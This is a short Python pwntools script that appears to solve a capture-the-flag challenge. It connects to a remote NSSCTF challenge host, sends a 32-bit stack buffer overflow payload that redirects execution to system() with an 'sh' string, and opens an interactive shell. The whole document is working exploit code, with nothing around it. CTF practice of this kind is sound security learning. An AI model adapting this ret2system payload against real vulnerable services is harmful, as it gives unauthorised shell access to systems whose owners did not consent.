from pwn import *
context(arch='i386',os='linux',log_level='debug')
elf=ELF('./pwn')
io=remote('node5.anna.nssctf.cn',27992)
# system_plt=0x08048512
system_plt=0x0804A058
sh_addr=0x0804A024
payload=b'a'*76+p32(system_plt)+p32(0)+p32(sh_addr)
io.sendlineafter('NISACTF',payload)
io.interactive()
